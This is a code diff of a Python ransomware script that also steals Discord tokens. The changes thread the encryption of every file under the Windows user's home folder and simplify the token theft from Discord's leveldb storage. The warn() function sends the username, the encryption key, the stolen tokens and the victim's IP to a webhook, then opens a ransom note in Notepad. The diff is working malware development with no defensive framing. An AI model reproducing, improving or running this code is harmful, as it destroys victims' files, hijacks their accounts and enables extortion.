@@ -9,9 +9,7 @@ import threading
 from pathlib import Path
 
 user = str(os.environ["USERNAME"])
-path1 = "C:\\Users\\" + user + "\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb"
-path2 = "C:\\Users\\" + user +"\\\\AppData\\\\Roaming\\\\discordcanary\\\\Local Storage\\\\leveldb"
-path3 = "C:\\Users\\" + user + "\\\\AppData\\\\Roaming\\\\discordptb\\\\Local Storage\\\\leveldb"
+pathds = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb"
 key = Fernet.generate_key()
 
 def find_tokens(path):
@@ -25,19 +23,6 @@ def find_tokens(path):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
-
-path1_isdir = os.path.isdir(path1)
-path2_isdir = os.path.isdir(path2)
-path3_isdir = os.path.isdir(path3)
-
-if path1_isdir:
-    tokens1 = [find_tokens(path1)]
-
-if path2_isdir:
-    tokens2 = [find_tokens(path2)]
-
-if path1_isdir:
-    tokens3 = [find_tokens(path3)]
 
 def timer():
     path1 = "C:\\\\Users\\\\" + user
@@ -60,7 +45,7 @@ def warn():
     ip = requests.get('https://api.ipify.org').text
     url = "webhook" # webhook url 
     data = {}
-    data["content"] = "Key Content for " + user + ": " + str(key) + " Discord tokens: " + " Stable client: " + tokens1 + " Canary: " + tokens2 + " PTB: " + tokens3
+    data["content"] = "Key Content for " + user + ": " + str(key) + " Discord tokens: " + " Stable client: " + str(find_tokens(pathds))
     data["username"] = ip
     requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
     f = open("ransom.txt", "w")
@@ -69,10 +54,14 @@ def warn():
     subprocess.call(r"notepad ransom.txt", shell=False)
 
 def main():
+    timerthread = threading.Thread(target=timer)
+    timerthread.start()
+    print("pog")
     path1 = "C:\\\\Users\\\\" + user 
     my_path = Path(path1)
     for file in my_path.glob("**/*.*"):
-        crypt(file)
+        crypthtread = threading.Thread(target=crypt, args=[file])
+        crypthtread.start()
     warn()
 
 main()
